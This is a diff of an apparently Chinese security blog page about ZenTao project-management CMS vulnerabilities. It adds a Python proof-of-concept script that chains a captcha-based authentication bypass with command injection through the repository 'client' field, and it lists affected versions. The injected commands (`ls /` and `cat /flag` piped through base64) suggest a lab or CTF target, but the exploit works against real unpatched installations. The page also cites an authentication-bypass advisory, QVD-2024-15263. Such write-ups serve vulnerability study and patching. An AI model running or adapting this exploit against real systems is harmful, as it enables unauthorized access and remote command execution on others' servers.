@@ -254,7 +254,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/CMS/" style="color: #03a9f4">CMS</a>
+                <a href="/blog/tags/CMS/" style="color: #00bcd4">CMS</a>
             </span>
             
         </span>
@@ -268,7 +268,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">723字</span>
+        <span class="post-count">1.1k字</span>
       </span>
     </span>
 
@@ -277,7 +277,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">3分</span>
+        <span class="post-count">6分</span>
       </span>
     </span>
     
@@ -299,7 +299,63 @@
 <p><a target="_blank" rel="noopener" href="https://oatmeal.vip/security/web-learning/zentaocms-11-6-rce/">https://oatmeal.vip/security/web-learning/zentaocms-11-6-rce/</a></p>
 <span id="more"></span>
 
-<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><hr>
+<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>poc：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''
+权限绕过+RCE POC 伪静态传参版
+禅道系统 影响版本 安全版本
+开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 18.0.beta2
+旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1 4.0.beta2
+企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2
+'''</span>
+<span class="token keyword">import</span> requests
+
+proxies <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">#"http": "127.0.0.1:8080",</span>
+    <span class="token comment">#"https": "127.0.0.1:8080",</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># url="http://10.211.55.3:8008"</span>
+    url1 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">'/misc-captcha-user.html'</span>
+    <span class="token comment"># url1 = url+'/index.php?m=misc&amp;f=captcha&amp;sessionVar=user'#非伪静态版本按照此格式传参</span>
+    <span class="token comment"># url2 = url+'/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my'#可判断验证绕过的链接</span>
+    url3 <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">'repo-create.html'</span>
+    url4 <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">'repo-edit-10000-10000.html'</span>
+    headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+        <span class="token string">"User-Agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"</span><span class="token punctuation">,</span>
+        <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span><span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span>
+        <span class="token string">"Cookie"</span><span class="token punctuation">:</span><span class="token string">"zentaosid=0w0; lang=zh-cn; device=desktop; theme=default"</span><span class="token punctuation">,</span>
+    <span class="token punctuation">&#125;</span>
+
+    headers2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"</span><span class="token punctuation">,</span>
+        <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span>
+        <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"zentaosid=0w0; lang=zh-cn; device=desktop; theme=default"</span><span class="token punctuation">,</span>
+        <span class="token string">"Content-Type"</span><span class="token punctuation">:</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>
+        <span class="token string">"X-Requested-With"</span><span class="token punctuation">:</span><span class="token string">"XMLHttpRequest"</span><span class="token punctuation">,</span>
+        <span class="token string">"Referer"</span><span class="token punctuation">:</span>url<span class="token operator">+</span><span class="token string">"/repo-edit-1-0.html"</span>
+    <span class="token punctuation">&#125;</span>
+
+    data1 <span class="token operator">=</span> <span class="token string">'product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid='</span>
+    data2 <span class="token operator">=</span> <span class="token string">'SCM=Git&amp;path=/etc&amp;client=`ls /|base64 -w 0`'</span>
+    data2 <span class="token operator">=</span> <span class="token string">'SCM=Git&amp;path=/etc&amp;client=`cat /flag|base64 -w 0`'</span>
+    s<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        req1 <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url1<span class="token punctuation">,</span>proxies<span class="token operator">=</span>proxies<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
+        req3 <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url3<span class="token punctuation">,</span>data<span class="token operator">=</span>data1<span class="token punctuation">,</span>proxies<span class="token operator">=</span>proxies<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers2<span class="token punctuation">)</span>
+        req4 <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url4<span class="token punctuation">,</span>data<span class="token operator">=</span>data2<span class="token punctuation">,</span>proxies<span class="token operator">=</span>proxies<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers2<span class="token punctuation">)</span>
+        <span class="token comment"># if 'uid=' in req4.text:</span>
+        <span class="token comment"># print(url,"")</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>req4<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token boolean">True</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token boolean">False</span>
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>check<span class="token punctuation">(</span><span class="token string">"http://localhost:88/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><hr>
 <h1 id="QVD-2024-15263（禅道身份认证绕过漏洞）"><a href="#QVD-2024-15263（禅道身份认证绕过漏洞）" class="headerlink" title="QVD-2024-15263（禅道身份认证绕过漏洞）"></a>QVD-2024-15263（禅道身份认证绕过漏洞）</h1><p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xiayu729100940/article/details/139776444">https://blog.csdn.net/xiayu729100940/article/details/139776444</a></p>
 <p>影响版本：</p>
 <p>v16.x &lt;&#x3D; 禅道 &lt; v18.12 （开源版）<br>v6.x &lt;&#x3D; 禅道 &lt; v8.12 （企业版）<br>v3.x &lt;&#x3D; 禅道 &lt; v4.12 （旗舰版）</p>
